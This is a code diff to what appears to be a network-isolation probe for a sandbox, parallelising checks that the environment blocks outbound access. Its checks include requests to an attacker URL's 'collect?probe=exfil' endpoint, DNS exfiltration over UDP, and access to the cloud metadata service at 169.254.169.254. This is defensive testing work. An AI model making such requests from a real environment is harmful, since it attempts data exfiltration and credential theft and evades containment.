@@ -154,16 +154,21 @@ const probes = {
   async net(task) {
     const gw = task.gateway;
     const results = {};
-    results.direct_internet_tcp = await tcp("1.1.1.1", 443);
-    results.metadata_service_tcp = await tcp("169.254.169.254", 80);
-    results.host_ssh_tcp = await tcp(gw, 22);
-    results.host_app_tcp = await tcp(gw, 3000);
-    results.udp_dns_exfil = await udpDns("8.8.8.8");
-    results.dns_resolution = await dnsLookup(new URL(task.attackerUrl).hostname);
-    results.proxy_attacker = await viaProxy(task.proxy, task.attackerUrl + "collect?probe=exfil");
-    results.proxy_metadata = await viaProxy(task.proxy, "http://169.254.169.254/v1.json");
-    results.proxy_https_offlist = await viaProxy(task.proxy, "https://example.com/");
-    results.proxy_allowed_target = await viaProxy(task.proxy, task.target);
+    // Independent checks run together so the probe finishes inside one timeout window.
+    const checks = {
+      direct_internet_tcp: () => tcp("1.1.1.1", 443),
+      metadata_service_tcp: () => tcp("169.254.169.254", 80),
+      host_ssh_tcp: () => tcp(gw, 22),
+      host_app_tcp: () => tcp(gw, 3000),
+      udp_dns_exfil: () => udpDns("8.8.8.8"),
+      dns_resolution: () => dnsLookup(new URL(task.attackerUrl).hostname),
+      proxy_attacker: () => viaProxy(task.proxy, task.attackerUrl + "collect?probe=exfil"),
+      proxy_metadata: () => viaProxy(task.proxy, "http://169.254.169.254/v1.json"),
+      proxy_https_offlist: () => viaProxy(task.proxy, "https://example.com/"),
+      proxy_allowed_target: () => viaProxy(task.proxy, task.target)
+    };
+    const settled = await Promise.all(Object.entries(checks).map(async ([k, fn]) => [k, await fn()]));
+    for (const [k, v] of settled) results[k] = v;
     return results;
   },
 
